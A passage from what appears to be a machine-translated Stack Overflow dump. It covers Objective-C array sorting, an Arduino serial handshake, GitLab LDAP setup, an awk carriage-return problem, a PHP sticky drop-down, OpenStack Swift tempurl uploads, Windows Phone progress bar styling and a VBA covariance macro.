     [numbers addObject:[NSNumber numberWithInteger:i]]; 
```

并在您的 .h 中声明为

```
-(NSMutableArray *)sortArray:(NSMutableArray *)numbers; 
```

这是上面在 Objective-C 中的翻译方法：

```
-(NSMutableArray *)sortArray:(NSMutableArray *)numbers
{
  NSInteger tmp = 0;
  for(int x = 0; x < [numbers count]; x++)
   for(int y = x + 1; y < 6; y++)
     if([numbers objectAtIndex:y] < [numbers objectAtIndex:x])
     {
       tmp = [numbers objectAtIndex:x];
       [numbers replaceObjectAtIndex:x withObject:[numbers objectAtIndex:y]];
       [numbers replaceObjectAtIndex:y withObject:tmp];
     }
  return numbers;
} 
```

您也可以在objective-c中调用一个方法，如下所示：

```
[self sortArray:numbers]; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T14:52:29.497

您似乎在这里有（至少）两个相关但独立的问题。

**1/ 如何创建一个数字数组**

Objective-C 数组以不可变 NSArray（固定内容）或可变 NSMutableArray（您可以添加删除和随机播放内容）的形式出现。你写的排序函数要求一个可变数组。

*使用NSNumber 对象*创建和填充不可变数组：

```
NSArray* array = @[@3,@5,@8,@2,@9,@1];   //"@1" is an NSNumber object literal
  //access: array[3] etc 
```

多维：

```
NSArray* arrayOfArrays @[@[@3,@5,@8],@[@2,@9,@1]];
  //access: arrayOfArrays[1][2] etc 
```

创建一个空的可变长度可变数组

```
NSMutableArray* mutableArray = [[NSMutableArray alloc] init]; 
```

创建并填充可变长度的可变数组

```
myArray = [NSMutableArray arrayWithObjects:@3,@5,@8,@2,@9,@1, nil];  //note nil termination 
```

将不可变的 NSArray 变成可变的 NSMutableArray

```
NSMutableArray* mutableArray = [array mutableCopy]; 
```

（但请注意，这只会将顶层呈现为可变的，如果它包含不可变的子数组，它们将保持不可变）

Objective-C 集合（NSArray、NSDictionary、NSSet）只能保存 Objective-C 对象。因此，如果要存储`int`s 或`float`s，则需要在添加到集合之前将它们装箱到 Objective-C NSNumber 对象中，然后再次将它们拆箱以访问该值。

```
int x;
float y;

NSNumber xNum = [NSNumber numberWithInt:x];  //box
NSNumber yNum = [NSNumber numberWithFloat:y];  //box

x = [xNum intValue]; //unbox
y = [yNum floatValue]; //unbox 
```

**2/ 如何翻译代码**

这是一个类似的翻译：

要创建（可变） myArray 对象：

```
NSMutableArray* myArray = [[NSMutableArray alloc] init];
Populate it:
[myArray addObjects:@3,@6,@8,@1,@9,nil];   //last value is nil to indicate termination 
```

方法：

```
- sortArray:(NSMutableArray*)myArray
{
    id tmp;
    for (int x = 0; x < [myArray count]; x++) {
        for (int y = x+1; y < 6; y++) {
            if ([myArray[y] floatValue] < [myArray[x] floatValue]) {
                tmp = myArray[x];
                myArray[x] = myArray[y];
                myArray[y] = tmp;
            }
        }
    }
} 
```

致电：

```
[self sortArray:myArray]; 
```

要使用对象范围声明，请在 @interface 部分中创建一个属性

```
@interface myObject:NSObject
@property (nonatomic, strong) NSMutableArray* myArray;
@end 
```

您仍然需要创建 myArray 才能使用它：

```
self.myArray = [[NSMutableArray alloc] init]; 
```

但是您将能够从对象内部的任何位置设置和访问它的值，因此：

```
self.myArray 
```

并且 - 如果它在公共头文件 @interface 部分中 - 从对象外部：

```
myObject.myArray 
```

# serial-port - Arduino：一次检查一个字符的字节数组

> ID：15526298
> 
> 赞同：0
> 
> 时间：2013-03-20T14:26:04.337
> 
> 标签：serial-port, bytearray, arduino, handshake

我使用发送一系列字节的程序通过串行与 Arduino 通信。

为了让 Arduino 意识到它正在接收消息而不是垃圾，我用字符“S”“T”“A”“R”“T”标记了我的字节数组的开头。在此之后最终将遵循一系列将分配给内部变量的字节（尚未实现）。

Arduino 必须按顺序读取每个字节并将其与字节数组进行比较，如果所有字节都以正确的顺序出现，它将继续程序的下一部分，否则它将丢弃当前字节并等待更多字节到达。

我试图以最有效和可读的方式实现它，而不是使用一系列嵌套的 if 语句。

到目前为止，我得到了：

```
byte inByte = 0;
byte handShake[] = {'S','T','A','R','T'};

void setup() {
  Serial.begin(9600);

}

void loop() 
{
  while (Serial.available()) 
{
  for (int x =0; x < sizeof(handShake) ; x++)
    {
    inByte = Serial.read();
    Serial.println(x);
    if (inByte == handShake[x]) 
     {
        if (x == (sizeof(handShake)-1)) {setArduino();}  
      }
       else break;
   }
  }
}

void setArduino () {
  Serial.println("Ready To Set Parameters");
} 
```

然而，这似乎没有超过第二个字节，我不知道为什么。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T15:30:52.187

更好的答案：这允许循环的其余部分在等待消息完成时进行迭代，如果未收到完整的握手消息，则计数器将重置。

```
byte inByte = 0;
char handShake[] = {'S','T','A','R','T'};
int messageIndex = 0;

void setup() {
  Serial.begin(9600);

}

void loop() 
{
  while (Serial.available()) 
  {
    inByte = Serial.read();
    Serial.println(messageIndex);
    if (inByte == handShake[messageIndex]) 
      {
        messageIndex++;
        if (messageIndex == sizeof(handShake)) {messageIndex = 0; setArduino();}  
      }
       else {messageIndex=0;}
  }
// Other code while waiting for message to finish
Serial.println("tick");
}

void setArduino () {
  Serial.println("Ready To Set Parameters");
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T15:14:45.910

解决了：

这是答案：

```
byte inByte = 0;
char handShake[] = {'S','T','A','R','T'};

void setup() {
  Serial.begin(9600);

}

void loop() 
{
  while (Serial.available()) 
  {
  for (int x =0; x < sizeof(handShake) ; x++)
    {
    inByte = Serial.read();
    Serial.println(x);
    if (inByte == handShake[x]) 
      {
       if (x == (sizeof(handShake)-1)) {setArduino();}  
       while(!Serial.available()) {delay(1);}
      }
       else {break;}
    }
  }
}

void setArduino () {
  Serial.println("Ready To Set Parameters");
} 
```

这可能不是最有效的方法，但我目前看不出它有问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-10-21T10:08:30.297

您可以尝试计算您的消息。CRC 是旧的很好的解决方案。我使用它，它非常适合我。我不确定您正在与哪种设备通信。

```
//define
const uint32_t Polynomial = 0xEDB88320;
const uint16_t NumBytes = 256;
uint8_t data[NumBytes];

/// compute CRC32
uint32_t crc32_bitwise(const void* data, uint16_t length, uint32_t previousCrc32 = 0)
{
  uint32_t crc = ~previousCrc32; // same as previousCrc32 ^ 0xFFFFFFFF
  uint8_t* current = (uint8_t*) data;

  while (length--)
  {
    crc ^= *current++;
    for (uint8_t j = 0; j < 8; j++)
    {
      uint8_t lowestBit = crc & 1;
      crc >>= 1;
      if (lowestBit)
        crc ^= Polynomial;
    }
  }
  return ~crc; // same as crc ^ 0xFFFFFFFF
}
void setup() {
  // put your setup code here, to run once:    
}

void loop() {
  // put your main code here, to run repeatedly:    
} 
```

当您需要计算 CRC 时

`uint32_t crc = crc32_bitwise(data_bytes, sizeof(data_bytes));`

`data_bytes`是字节数组。

然后您可以获取所有设置或消息`byte data[x]`并计算CRC。然后您可以将CRC添加到消息并发送消息`byte data[x+sizeof(CRC)]`

PS 使用`byte`而不是`int`. 例如。`for(byte x =0; x<sizeof(handShake); x++)`

# ldap - Apache Directory 2.0-M11 和 Gitlab LDAP 身份验证

> ID：15526302
> 
> 赞同：1
> 
> 时间：2013-03-20T14:26:13.977
> 
> 标签：ldap, gitlab

我正在尝试使用带有 Apache Directory 2.0-M11 的 Gitlab v.4.0 设置 LDAP 身份验证 - Gitlab 安装的配置是根据文档完成的，我看到它试图命中 LDAP。但是，我在 LDAP 端收到以下错误：

[http://pastebin.com/SkmtqE7W](http://pastebin.com/SkmtqE7W)

Gitlab LDAP 配置（gitlab.yml）：

[http://pastebin.com/quJ9kzJR](http://pastebin.com/quJ9kzJR)

有什么方法可以以最少的努力或最少的代码定制来使 Gitlab 和 Apache Directory 成为朋友？

谢谢，弗拉基米尔。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T19:10:10.643

检查基础对象是否正确。真的`base: 'dc=example,dc=com,ou=Users`是什么意思，也就是说，`dc=com`是 的直接下属`ou=users`吗？正常的约定是`ou=users,dc=example,dc=com`.

# bash - awk blues.. 怎么了？

> ID：15526305
> 
> 赞同：2
> 
> 时间：2013-03-20T14:26:23.170
> 
> 标签：bash, awk, solaris

我必须从文件'main.csv'中读取并打印输出如下：

```
Set 4,1095,Set 1 or 4
Set 2,18277,Set 2 or 3
Set 1 or 4,Set 4,944
Set 2,1373,Set 2 or 3
Set 4,83,Set 1 or 4
Set 2,14356,Set 2 or 3
Set 2,14800,Set 2 or 3 
```

我在下面尝试了各自的输出：

```
awk 'BEGIN {FS=","}{OFS=","}{print $12,$15}' main.csv
Set 4,1095
Set 2,18277
Set 4,944
Set 2,1373
Set 4,83

awk 'BEGIN {FS=","}{OFS=","}{if($12 == "Set 1" || $12 == "Set 4"){print "Set 1 or 4",$12,$15}else{print "Set 2 or 3",$12,$15}}' main.csv
Set 1 or 4,Set 4,1095
Set 2 or 3,Set 2,18277
Set 1 or 4,Set 4,944
Set 2 or 3,Set 2,1373
Set 1 or 4,Set 4,83
Set 2 or 3,Set 2,14356
Set 2 or 3,Set 2,14800

awk 'BEGIN {FS=","}{OFS=","}{if($12 == "Set 1" || $12 == "Set 4"){print $12,$15,"Set 1 or 4"}else{print $12,$15,"Set 2 or 3"}}' main.csv
,Set 1 or 4
,Set 2 or 3
,Set 1 or 4
,Set 2 or 3
,Set 1 or 4
,Set 2 or 3
,Set 2 or 3 
```

前 2 个“awk”运行良好，那么为什么不是第三个呢？

main.csv 每行有 15 个逗号分隔值，第 12 个值如下所示：

```
Set 1
Set 2
Set 3
Set 4 
```

PS：我在 Solaris 10 上使用 bash

我仍然对“awk”问题很感兴趣，以下是我注意到的……不知道为什么会发生（我在 Solaris 10 和 RHEL 5 上都遇到了这个问题）

```
awk -F, '{print "Var13->"$13,"\t","Var12->"$12,"\t","Var15 ->"$15}' < main.csv
Var13->0         Var12->Set 4    Var15 ->1095
Var13->1631      Var12->Set 2    Var15 ->18277
Var13->0         Var12->Set 4    Var15 ->944
Var13->2832      Var12->Set 2    Var15 ->1373
Var13->0         Var12->Set 4    Var15 ->83

awk -F, '{print "Var13 & Var15->"$13,"\t","Var12->"$12,"\t","Var15 ->"$15}' < main.csv
Var13 & Var15->0         Var12->Set 4    Var15 ->1095
Var13 & Var15->1631      Var12->Set 2    Var15 ->18277
Var13 & Var15->0         Var12->Set 4    Var15 ->944
Var13 & Var15->2832      Var12->Set 2    Var15 ->1373
Var13 & Var15->0         Var12->Set 4    Var15 ->83

awk -F, '{print "Var13 & Var15->"$13,$15"\t","Var12->"$12,"\t","Var15 ->"$15}' < main.csv
or
awk -F, '{print "Var13 & Var15->"$13,$15,"\t","Var12->"$12,"\t","Var15 ->"$15}' < main.csv
or
awk -F, '{print "Var13 & Var15->"$13,"\t",$15,"\t","Var12->"$12,"\t","Var15 ->"$15}' < main.csv

ar13 &  Var12->Set 4    Var15 ->1095
ar13 &  Var12->Set 2 27 Var15 ->18277
ar13 &  Var12->Set 4    Var15 ->944
ar13 &  Var12->Set 2 73 Var15 ->1373
ar13 &  Var12->Set 4    Var15 ->83
ar13 &  Var12->Set 2 56 Var15 ->14356 
```

正如你所看到的，最后 3 次运行已经吃掉了“Var13”输出中的字母并添加了一些垃圾信息。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T14:45:22.343

无需为此投票，我只是想粘贴一些格式化的代码。

您的程序已经足够大，值得拥有自己的代码文件，可以以文明的方式对其进行格式化并与其他版本进行比较。当我们这样做时，我们可以很容易地看到您在每个输入行的操作中分配 OFS。没有造成任何伤害，但这显然是无意的，因此您损失了**[1337 分。](http://en.wikipedia.org/wiki/Leet)**有了这个固定，我们继续前进。

您无法区分单线并学到任何东西。**[在格式良好的代码上运行 diff(1)](http://modman.unixdev.net/?sektion=1&page=diff&manpath=NetBSD-2.0)**表明只有输出行发生了变化，因此两个程序同样有效。您必须在不同的条件下进行了第三次运行。也许是不同的输入文件？

```
BEGIN  {
  FS  = ","
  OFS = ","
}
{ if($12 == "Set 1" || $12 == "Set 4") {
    print "Set 1 or 4",$12,$15
  } else {
    print "Set 2 or 3",$12,$15
  }
} 
```

* * *

```
BEGIN {
  FS  = ","
  OFS = ","
}
{ if($12 == "Set 1" || $12 == "Set 4") {
    print $12,$15,"Set 1 or 4"
  } else {
    print $12,$15,"Set 2 or 3"
  }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T18:15:22.483

我的钱是你在“.csv”文件行的末尾有 control-Ms，导致显示行的第一部分被隐藏。

为您带来 Windows Vista 等的人免费为您带来这种腐败。

在“.csv”文件上运行“dos2unix”，然后重试。

如果这不起作用，请运行“where awk”和“awk --version”并告诉我们结果。在 Solaris 上，您必须使用 /usr/xpg4/bin/awk 或 nawk，不要使用 /bin/awk 或 /usr/bin/awk，因为它们都是旧的、损坏的 awk。

# php - 用于下拉的 PHP 粘性表单

> ID：15526306
> 
> 赞同：0
> 
> 时间：2013-03-20T14:26:29.453
> 
> 标签：php, drop-down-menu, sticky

我无法将下拉菜单设置为粘性（以便在第一次提交表单后，将在下一页的表单中预先选择所选择的选项）。我删除了一些我认为不相关的代码。我尝试将值设为 $_GET['continent'] 但这没有用。有人有想法吗？见函数 createpulldown

```
 <!DOCTYPE html>
 <head>
 <title>Homework 14</title>  
 </head>
 <body>

<?php 
if (isset($_GET['submitted']))
    handleform($_GET['country']);

displayform("country");

?>
</body>

function displayform($menuname) {
    echo "<fieldset><legend>Select a continent and I will show you information from the CIA about it.</legend>
            <form method = 'get'>";
            createpulldown($menuname);
            echo "<input type='submit' name='submitted' value='Search'>
            </form>
          </fieldset>";
}

function createpulldown($menuname) {
    echo "<select name='$menuname'>";
    $dbc = connectToDB();
    $query = "SELECT Continent FROM countries GROUP BY Continent";
    $result = performQuery($dbc, $query);

    while ($row=mysqli_fetch_array($result, MYSQLI_ASSOC)){

        $continent = $row['Continent'];

        if (isset($_GET[$menuname]))
            echo "<option name='continent' value = $continent selected>$continent</option>\n";
        else
            echo "<option name='continent' value = $continent>$continent</option>\n";
    }

    echo "</select>";
    disconnectFromDB($dbc, $result);
}
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T15:17:53.377

您想检查从 $_GET 检索到的值是否等于选项值之一。

试试这个你的while语句：

```
while ($row=mysqli_fetch_array($result, MYSQLI_ASSOC)){
    $continent = $row['Continent'];
    if ($_GET[$menuname] == $continent)
        echo "<option name='continent' value='$continent' selected>$continent</option>\n";
    else
        echo "<option name='continent' value='$continent'>$continent</option>\n";
} 
```

我还修复了一个语法错误。您需要将选项值用单引号括起来。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T15:19:51.520

```
while ($row=mysqli_fetch_array($result, MYSQLI_ASSOC)){

    $continent = $row['Continent'];

    if (isset($_GET[$menuname]))
        echo "<option name='continent' value = $continent selected>$continent</option>\n";
    else
        echo "<option name='continent' value = $continent>$continent</option>\n";
} 
```

您在此处检查是否将名为 $menuname 的 GET 参数传递给您的脚本——但这对于您创建的所有选项都是相同的，要么参数存在，要么不存在。

您想要做的是将参数的值与您正在编写的当前 $continent 值进行比较——如果它们相等，请选择当前选项，否则不要。

# upload - 不能使用带有 put 方法的 tempurl 上传

> ID：15526307
> 
> 赞同：0
> 
> 时间：2013-03-20T14:26:35.053
> 
> 标签：upload, put, openstack, openstack-swift

我已经安装了 keystone 和 swift 并配置了 proxy-server.conf。我可以毫无问题地生成一个临时 url 来下载一个对象。但是当我使用相同的方式（我确实将方法更改为“PUT”）生成一个临时 url 来上传一个对象时，我得到了错误 401 ......日志说找不到认证头...

我已经尝试了所有我能想到的方法来解决问题，但我没有运气：<

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-25T02:18:18.203

原来这是两个服务器之间的系统日期不同步引起的愚蠢问题......

# silverlight - Windows Phone 中的进度条点间距问题

> ID：15526314
> 
> 赞同：5
> 
> 时间：2013-03-20T14:26:53.577
> 
> 标签：silverlight, windows-phone-7, xaml, progress-bar

当我在宽度为 120 的网格内使用进度条（IsIndertiminate=true）时，进度条动画看起来很奇怪。进度点似乎并排移动，它们之间没有任何适当的间距。此外，由于这个（宽度更小），点分别在开始和结束时移开/靠近的效果不太明显。

那么，当我以有限的宽度显示进度条时，如何使进度条看起来更好。我尝试自己搜索并更改progressBar的属性，但无法达到令人满意的状态。

编辑：在我的 grid.row 中，通过将我的 progressBar 的宽度设置为“自动”，我能够实现理想的间距/外观（它仍然不完美，但对我有用）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-03T20:20:38.067

它只需要对该控件`Style` `Template`进行一些自定义，以对充当`ProgressBar`自身的形状进行一些调整。

目前我面前没有 WP7 ProgressBar 的默认样式模板，但是如果您在 Expression Blend 中打开您的项目，请右键单击它并选择“编辑模板 -> 编辑副本（或编辑原始文件）要公开样式模板，您会看到形状，我认为甚至驱动它的情节提要动画也准备好根据您的心愿进行编辑。

如果您提供默认模板的副本，我相信如果您自己没有得到它，我们可以很快为您提供解决方案。希望这可以帮助 ：）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T06:24:00.743

进度条默认样式，每个矩形都可以修改！

```
<Style x:Key="PerformanceProgressBarStyle1" TargetType="toolkit:PerformanceProgressBar">
        <Setter Property="IsIndeterminate" Value="False"/>
        <Setter Property="Foreground" Value="{StaticResource PhoneAccentBrush}"/>
        <Setter Property="Background" Value="{StaticResource PhoneAccentBrush}"/>
        <Setter Property="IsHitTestVisible" Value="False"/>
        <Setter Property="Padding" Value="{StaticResource PhoneHorizontalMargin}"/>
        <Setter Property="Template">
            <Setter.Value>
                <ControlTemplate TargetType="toolkit:PerformanceProgressBar">
                    <ProgressBar x:Name="EmbeddedProgressBar" Background="{TemplateBinding Background}" Foreground="{TemplateBinding Foreground}" IsIndeterminate="{TemplateBinding ActualIsIndeterminate}" Padding="{TemplateBinding Padding}">
                        <ProgressBar.Template>
                            <ControlTemplate TargetType="ProgressBar">
                                <toolkitPrimitives:RelativeAnimatingContentControl HorizontalContentAlignment="Stretch" VerticalContentAlignment="Stretch">
                                    <toolkitPrimitives:RelativeAnimatingContentControl.Resources>
                                        <ExponentialEase x:Key="ProgressBarEaseOut" EasingMode="EaseOut" Exponent="1"/>
                                        <ExponentialEase x:Key="ProgressBarEaseIn" EasingMode="EaseIn" Exponent="1"/>
                                    </toolkitPrimitives:RelativeAnimatingContentControl.Resources>
                                    <VisualStateManager.VisualStateGroups>
                                        <VisualStateGroup x:Name="CommonStates">
                                            <VisualState x:Name="Determinate"/>
                                            <VisualState x:Name="Indeterminate">
                                                <Storyboard Duration="00:00:04.4" RepeatBehavior="Forever">
                                                    <ObjectAnimationUsingKeyFrames Storyboard.TargetProperty="Visibility" Storyboard.TargetName="IndeterminateRoot">
                                                        <DiscreteObjectKeyFrame KeyTime="0">
                                                            <DiscreteObjectKeyFrame.Value>
                                                                <Visibility>Visible</Visibility>
                                                            </DiscreteObjectKeyFrame.Value>
                                                        </DiscreteObjectKeyFrame>
                                                    </ObjectAnimationUsingKeyFrames>
                                                    <DoubleAnimationUsingKeyFrames BeginTime="00:00:00.0" Storyboard.TargetProperty="X" Storyboard.TargetName="R1TT">
                                                        <LinearDoubleKeyFrame KeyTime="00:00:00.0" Value="0.1"/>
                                                        <EasingDoubleKeyFrame EasingFunction="{StaticResource ProgressBarEaseOut}" KeyTime="00:00:00.5" Value="33.1"/>
                                                        <LinearDoubleKeyFrame KeyTime="00:00:02.0" Value="66.1"/>
                                                        <EasingDoubleKeyFrame EasingFunction="{StaticResource ProgressBarEaseIn}" KeyTime="00:00:02.5" Value="100.1"/>
                                                    </DoubleAnimationUsingKeyFrames>
                                                    <DoubleAnimationUsingKeyFrames BeginTime="00:00:00.2" Storyboard.TargetProperty="X" Storyboard.TargetName="R2TT">
                                                        <LinearDoubleKeyFrame KeyTime="00:00:00.0" Value="0.1"/>
                                                        <EasingDoubleKeyFrame EasingFunction="{StaticResource ProgressBarEaseOut}" KeyTime="00:00:00.5" Value="33.1"/>
                                                        <LinearDoubleKeyFrame KeyTime="00:00:02.0" Value="66.1"/>
                                                        <EasingDoubleKeyFrame EasingFunction="{StaticResource ProgressBarEaseIn}" KeyTime="00:00:02.5" Value="100.1"/>
                                                    </DoubleAnimationUsingKeyFrames>
                                                    <DoubleAnimationUsingKeyFrames BeginTime="00:00:00.4" Storyboard.TargetProperty="X" Storyboard.TargetName="R3TT">
                                                        <LinearDoubleKeyFrame KeyTime="00:00:00.0" Value="0.1"/>
                                                        <EasingDoubleKeyFrame EasingFunction="{StaticResource ProgressBarEaseOut}" KeyTime="00:00:00.5" Value="33.1"/>
                                                        <LinearDoubleKeyFrame KeyTime="00:00:02.0" Value="66.1"/>
                                                        <EasingDoubleKeyFrame EasingFunction="{StaticResource ProgressBarEaseIn}" KeyTime="00:00:02.5" Value="100.1"/>
                                                    </DoubleAnimationUsingKeyFrames>
                                                    <DoubleAnimationUsingKeyFrames BeginTime="00:00:00.6" Storyboard.TargetProperty="X" Storyboard.TargetName="R4TT">
                                                        <LinearDoubleKeyFrame KeyTime="00:00:00.0" Value="0.1"/>
                                                        <EasingDoubleKeyFrame EasingFunction="{StaticResource ProgressBarEaseOut}" KeyTime="00:00:00.5" Value="33.1"/>
                                                        <LinearDoubleKeyFrame KeyTime="00:00:02.0" Value="66.1"/>
                                                        <EasingDoubleKeyFrame EasingFunction="{StaticResource ProgressBarEaseIn}" KeyTime="00:00:02.5" Value="100.1"/>
                                                    </DoubleAnimationUsingKeyFrames>
                                                    <DoubleAnimationUsingKeyFrames BeginTime="00:00:00.8" Storyboard.TargetProperty="X" Storyboard.TargetName="R5TT">
                                                        <LinearDoubleKeyFrame KeyTime="00:00:00.0" Value="0.1"/>
                                                        <EasingDoubleKeyFrame EasingFunction="{StaticResource ProgressBarEaseOut}" KeyTime="00:00:00.5" Value="33.1"/>
                                                        <LinearDoubleKeyFrame KeyTime="00:00:02.0" Value="66.1"/>
                                                        <EasingDoubleKeyFrame EasingFunction="{StaticResource ProgressBarEaseIn}" KeyTime="00:00:02.5" Value="100.1"/>
                                                    </DoubleAnimationUsingKeyFrames>
                                                    <DoubleAnimationUsingKeyFrames BeginTime="00:00:00.0" Storyboard.TargetProperty="Opacity" Storyboard.TargetName="R1">
                                                        <DiscreteDoubleKeyFrame KeyTime="0" Value="1"/>
                                                        <DiscreteDoubleKeyFrame KeyTime="00:00:02.5" Value="0"/>
                                                    </DoubleAnimationUsingKeyFrames>
                                                    <DoubleAnimationUsingKeyFrames BeginTime="00:00:00.2" Storyboard.TargetProperty="Opacity" Storyboard.TargetName="R2">
                                                        <DiscreteDoubleKeyFrame KeyTime="0" Value="1"/>
                                                        <DiscreteDoubleKeyFrame KeyTime="00:00:02.5" Value="0"/>
                                                    </DoubleAnimationUsingKeyFrames>
                                                    <DoubleAnimationUsingKeyFrames BeginTime="00:00:00.4" Storyboard.TargetProperty="Opacity" Storyboard.TargetName="R3">
                                                        <DiscreteDoubleKeyFrame KeyTime="0" Value="1"/>
                                                        <DiscreteDoubleKeyFrame KeyTime="00:00:02.5" Value="0"/>
                                                    </DoubleAnimationUsingKeyFrames>
                                                    <DoubleAnimationUsingKeyFrames BeginTime="00:00:00.6" Storyboard.TargetProperty="Opacity" Storyboard.TargetName="R4">
                                                        <DiscreteDoubleKeyFrame KeyTime="0" Value="1"/>
                                                        <DiscreteDoubleKeyFrame KeyTime="00:00:02.5" Value="0"/>
                                                    </DoubleAnimationUsingKeyFrames>
                                                    <DoubleAnimationUsingKeyFrames BeginTime="00:00:00.8" Storyboard.TargetProperty="Opacity" Storyboard.TargetName="R5">
                                                        <DiscreteDoubleKeyFrame KeyTime="0" Value="1"/>
                                                        <DiscreteDoubleKeyFrame KeyTime="00:00:02.5" Value="0"/>
                                                    </DoubleAnimationUsingKeyFrames>
                                                </Storyboard>
                                            </VisualState>
                                        </VisualStateGroup>
                                    </VisualStateManager.VisualStateGroups>
                                    <Border x:Name="IndeterminateRoot" Margin="{TemplateBinding Padding}">
                                        <Grid HorizontalAlignment="Left">
                                            <Rectangle x:Name="R1" CacheMode="BitmapCache" Fill="{TemplateBinding Foreground}" Height="4" IsHitTestVisible="False" Opacity="0" Width="4">
                                                <Rectangle.RenderTransform>
                                                    <TranslateTransform x:Name="R1TT"/>
                                                </Rectangle.RenderTransform>
                                            </Rectangle>
                                            <Rectangle x:Name="R2" CacheMode="BitmapCache" Fill="{TemplateBinding Foreground}" Height="4" IsHitTestVisible="False" Opacity="0" Width="4">
                                                <Rectangle.RenderTransform>
                                                    <TranslateTransform x:Name="R2TT"/>
                                                </Rectangle.RenderTransform>
                                            </Rectangle>
                                            <Rectangle x:Name="R3" CacheMode="BitmapCache" Fill="{TemplateBinding Foreground}" Height="4" IsHitTestVisible="False" Opacity="0" Width="4">
                                                <Rectangle.RenderTransform>
                                                    <TranslateTransform x:Name="R3TT"/>
                                                </Rectangle.RenderTransform>
                                            </Rectangle>
                                            <Rectangle x:Name="R4" CacheMode="BitmapCache" Fill="{TemplateBinding Foreground}" Height="4" IsHitTestVisible="False" Opacity="0" Width="4">
                                                <Rectangle.RenderTransform>
                                                    <TranslateTransform x:Name="R4TT"/>
                                                </Rectangle.RenderTransform>
                                            </Rectangle>
                                            <Rectangle x:Name="R5" CacheMode="BitmapCache" Fill="{TemplateBinding Foreground}" Height="4" IsHitTestVisible="False" Opacity="0" Width="4">
                                                <Rectangle.RenderTransform>
                                                    <TranslateTransform x:Name="R5TT"/>
                                                </Rectangle.RenderTransform>
                                            </Rectangle>
                                        </Grid>
                                    </Border>
                                </toolkitPrimitives:RelativeAnimatingContentControl>
                            </ControlTemplate>
                        </ProgressBar.Template>
                        <VisualStateManager.VisualStateGroups>
                            <VisualStateGroup x:Name="VisibilityStates">
                                <VisualStateGroup.Transitions>
                                    <VisualTransition GeneratedDuration="0:0:0.25" To="Normal"/>
                                    <VisualTransition GeneratedDuration="0:0:0.75" To="Hidden"/>
                                </VisualStateGroup.Transitions>
                                <VisualState x:Name="Normal"/>
                                <VisualState x:Name="Hidden">
                                    <Storyboard>
                                        <DoubleAnimation To="0" Storyboard.TargetProperty="(UIElement.Opacity)" Storyboard.TargetName="EmbeddedProgressBar"/>
                                    </Storyboard>
                                </VisualState>
                            </VisualStateGroup>
                        </VisualStateManager.VisualStateGroups>
                    </ProgressBar>
                </ControlTemplate>
            </Setter.Value>
        </Setter>
    </Style> 
```

例如，只需设置`Widht = "2" Height = "2"`可能就是您需要的！

```
 <Rectangle x:Name="R1" CacheMode="BitmapCache" Fill="{TemplateBinding Foreground}" Height="2" IsHitTestVisible="False" Opacity="0" Width="2"> 
```

您还可以使用任何形状，而不仅仅是矩形。不要忘记为您的 ProgresBar 分配此样式。

希望它的帮助。

# vba - 使用 VBA 计算协方差矩阵

> ID：15526316
> 
> 赞同：0
> 
> 时间：2013-03-20T14:27:00.797
> 
> 标签：vba, excel, covariance

我需要协方差计算的帮助/指导。我编写了以下程序来计算 10 年股票数据的协方差。问题是我收到一个错误，指出下标超出范围。我调用函数的方式是

CalcCovarAll firstColPick:=17, SecColPick:=17, ColPrint:=42

'firstColPick 是第一列pick的地址

'secColPick 是第二列pick的地址

'colPrint 是将输出打印到单元格的特定列上。

任何快速帮助都会非常有帮助。我认为我没有正确实现该功能

```
Sub CalcCovarAll(ByVal firstColPick As Integer, ByVal SecColPick As Integer, ByVal   ColPrint As Integer)
Dim secondPick As Range
Dim secondValue As Variant
Dim firstPick As Range
Dim firstValue As Variant
Dim wksSheet As Worksheet

Dim rowPrint As Range
Dim cvaluePrint As Variant

Dim Row As Integer
Dim col As Integer

'setting up the active worksheet
Set wksSheet = Workbooks("VaR_cw2 (2).xlsm").Worksheets("Sheet1")
'setting up the pickup of first column
Set firstPick = Range(Cells(4, firstColPick), Cells(2873 + 1, firstColPick))
firstValue = firstPick.Value

'setting up pickup of second column
Set secondPick = Range(Cells(4, SecColPick), Cells(2873 + 1, SecColPick))
 secondValue = secondPick.Value
'setting up column printing
Set rowPrint = Range(Cells(5, ColPrint), Cells(2873 + 1, ColPrint))
cvaluePrint = rowPrint.Value

 For Row = LBound(secondValue) To UBound(secondValue) - 1
    cvaluePrint(Row + 1, 1) = Application.Covar(firstValue, secondValue)
Next Row

rowPrint = cvaluePrint
End Sub 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T16:44:26.950

rowPrint 从第 5 行开始，而 secondPick 从第 4 行开始。这意味着 cvaluePrint 包含的项目小于 secondValue。

cvaluePrint（1 到 2870）（5 到 2874 - VBA 中的所有数组都从 1 开始，而不是从 5 开始）

secondValue（1 到 2871）（4 到 2874 - VBA 中的所有数组都从 1 开始，而不是从 4 开始）

当您执行 Row 循环时，它从 1 变为 2870，但是当您键入 cvaluePrint(Row + 1, 1) 时，您调用的是从 2 到 2871。最后一行超出范围。使用 cvaluePrint(Row, 1)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T18:55:21.323

如果您在下面的行中遇到错误，请确保文件名正确并且该文件存在于您的硬盘驱动器上并且已打开。

```
Set wksSheet = Workbooks("VaR_cw2 (2).xlsm").Worksheets("Sheet1") 
```

在代码顶部使用**Option Base 1并更改以下行**

```
For Row = LBound(secondValue) To UBound(secondValue) 
    cvaluePrint(Row + 1, 1) = Application.Covar(firstValue, secondValue)
Next Row 
```

还要确保您的输入变量大于 0。

今后，当您针对任何错误发布任何问题时，请同时指定行号。如果可能，截图。它将帮助您的查询更快地解决。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-04T10:53:57.663

改变

```
cvaluePrint(Row + 1, 1) = Application.Covar(firstValue, secondValue) 
```

到

```
cvaluePrint(Row, 1) = Application.Covar(firstValue, secondValue) 
```

